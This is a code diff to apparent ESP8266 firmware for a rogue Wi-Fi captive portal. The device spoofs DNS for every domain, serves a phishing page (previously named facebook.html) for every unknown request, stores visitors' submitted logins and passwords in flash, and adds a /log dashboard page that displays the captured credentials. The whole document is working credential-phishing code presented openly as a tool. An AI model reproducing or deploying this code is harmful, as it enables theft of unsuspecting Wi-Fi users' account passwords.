@@ -4,11 +4,9 @@
 #include <ESP8266WebServer.h>
 #include <FS.h>
 
-// Default SSID name
-const char* SSID_NAME = "Shopping xyz";
+// Include local libraries
+#include "util.h"
 
-// Credentials file
-String credentialsFile = "/credentials.txt";
 
 // Gateway
 IPAddress APIP(172, 0, 0, 1);
@@ -22,35 +20,38 @@ bool render(String path) {
     file.close();
     return true;
   }
-  Serial.println("\nFile " + path + " Not Found: ");
+  err("File " + path + " not found.");
   return false;
 }
 
+/*
+ * Save credentials sent by user
+ */
 String saveCredentials() {
-  String credentials = webServer.arg("login") + "|" + webServer.arg("pass");
-
-  File file = SPIFFS.open(credentialsFile, "w");
-  
-  if (!file) { return "\nError opening file for writing"; }
-  int bytesWritten = file.print(credentials);
-  if (bytesWritten == 0) { return "\nFile write failed"; }
-  
-  file.close();
-  return "<h1> Login realizado com sucesso! </h1>";
+  String credentials = webServer.arg("login") + "|" + webServer.arg("pass") + "\n";
+  bool writeFileResult = writeFile(credentialsFile, credentials, true);
+  if(writeFileResult) {
+    return redirectHTML("/success");
+  }
+  else {
+    return "<h1> Ocorreu um erro. Tente novamente! </h1>"; 
+  }
 }
 
-void showCredentials()
+/*
+ * Show credentials captured
+ */
+String showCredentials()
 {
-  File file = SPIFFS.open(credentialsFile, "r");
-  
-  if (!file) { Serial.println("\nFailed to open file for reading"); }
-  
-  Serial.println("\nCredentials :");
-  while (file.available())
-  {
-    Serial.write(file.read());
-  }
-  file.close();
+  String credentials = readFile(credentialsFile);
+
+  String _header = readFile("/dashboard/header.html");
+  String _footer = readFile("/dashboard/footer.html");
+  String _body = readFile("/dashboard/log.html");
+  String _script = injectJS(credentials);
+
+  String fullpage = _header + _script + _body + _footer;
+  return fullpage;
 }
 
 void setup() {
@@ -64,25 +65,29 @@ void setup() {
 
   // Start webserver
   dnsServer.start(53, "*", APIP); // DNS spoofing (Only for HTTP)
+  webServer.begin();
 
+  /*
+   * Routes
+   */
   webServer.on("/login",[]() {
     webServer.send(200, "text/html", saveCredentials());
   });
 
+  webServer.on("/success",[]() {
+    webServer.send(200, "text/html", readFile("/pages/success.html"));
+  });
+
   webServer.on("/log",[]() {
-    showCredentials();
-    webServer.send(200, "text/html", "<h1>Go to serial monitor</h1>");
+    webServer.send(200, "text/html", showCredentials());
   });
   
   webServer.onNotFound([]() {
-    render("/pages/facebook.html");
+    webServer.send(200, "text/html", readFile(phishingPage));
   });
-  
-  webServer.begin();
 }
 
 void loop() {
-  // put your main code here, to run repeatedly:  
   dnsServer.processNextRequest();
   webServer.handleClient();
   delay(10);
